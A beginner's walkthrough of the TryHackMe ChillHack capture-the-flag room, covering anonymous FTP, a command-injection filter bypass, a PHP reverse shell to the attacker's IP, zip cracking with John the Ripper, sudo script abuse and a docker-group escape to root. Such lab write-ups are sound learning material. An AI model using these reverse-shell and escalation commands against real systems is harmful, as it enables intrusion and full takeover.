
# ChillHack CTF Walkthrough ☃️  
*My learning journey through ChillHack on TryHackMe*  

Hey folks! 👋  
I'm just getting started in the world of cybersecurity and decided to tackle the **ChillHack** room on TryHackMe. This write-up captures my step-by-step adventure — full of confusion, small wins, and a ton of learning along the way!

---

## 🧊 Step 1: FTP Access - Anonymous Allowed?  
So the first hint I found was that anonymous login on FTP was allowed. Boom — I was in! 🔓

There was a note from **Apaar** that said:  
> *"odh told me that there is some filtering on strings being put in the command."*

Hmm... interesting. Sounds like we’ll be playing with **command injection** later on!

---

## 🖥️ Step 2: Command Execution via Web  

I found a juicy-looking URL:  
```
http://chillhack.thm/secret/
```

It turns out there's a form that lets us run commands on the server. But... of course, there's some filtering. No straight-up `cat index.html` for us 😤

### Bypass Time!  
To get around the filter, I tried a trick:  
```
c/at index.html
```
It worked! Filters can’t stop me forever 😎

---

## 🐚 Step 3: Reverse Shell With PHP  

Time to pop a shell! Let's set up a Netcat listener first:  
```
nc -lvnp 7777
```

Then fire off a PHP reverse shell:
```bash
/usr/bin/php -r '$sock=fsockopen("10.8.27.206",7777);exec("sh <&3 >&3 2>&3");'
```

I originally tried without the full path to PHP but got no response. Lesson learned: **use `/usr/bin/php`** — always double-check where binaries live using `which php`.

---

## 🔑 Step 4: Finding Keys & Getting SSH Access  

I stumbled on an **authorized_keys** file for the user Apaar! Huge win.  

Here's what I found (snippet):  
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ...
```

Once we’re in, stabilize that shell so it’s less wonky. Always helps.

---

## 🖼️ Step 5: Steganography & Cracking Passwords  

Downloaded some image files using `wget` and tried out **steghide** to extract hidden goodies.

### Cracked a zip file with John the Ripper:
```bash
zip2john hidden_data.txt > input_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt input_john.txt
```

And the password?  
```
pass1word
```

Very creative 😅

---

## 🧠 Step 6: Base64 Decode Magic  

Found something that looked encoded:  
```bash
echo "aGFzaA==" | base64 -d
```

Turns out the password was:  
```
!d0ntKn0wmYp@ssw0rd
```

---

## 🔍 Step 7: Finding More Users  

Dug through `/etc/passwd` and found additional users. Time to use SSH to login with the creds we’ve gathered.

---

## 🧪 Step 8: Sudo Exploitation - Meet helpline.sh  

Ran `sudo -l` and noticed something interesting. As **Apaar**, I could run a script: `helpline.sh`.

Checked the script...  
And boom 💥 — it passed input directly to bash! Classic **command injection** vulnerability.

```bash
/bin/bash
```

Now I had a proper shell as Apaar and grabbed `user.txt` 🏁

---

## 🐳 Step 9: Docker Privilege Escalation  

Checked the `id` command — turns out the user was in the `docker` group.

I remembered a neat trick from GTFOBins:  
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

That gave me a **root shell**. Just like that. Game over 🎮

---

## 🏁 Final Thoughts  

This box was **super fun** and full of classic techniques:  
- FTP enumeration  
- Command injection  
- Reverse shells  
- Steganography  
- Zip cracking  
- Sudo misconfigurations  
- Docker privilege escalation  

I learned **a lot** doing this — and still have miles to go! 🚀  
If you're also just starting out, I hope this helps you or at least makes you feel a little less lost 😅

---

## 📸 Screenshot Proofs  

I've added a few screenshots (see [screenshots folder](./screenshots/)) to document my progress if you want to follow along.

---

Thanks for reading — and feel free to reach out if you're on a similar journey! 💻🔐
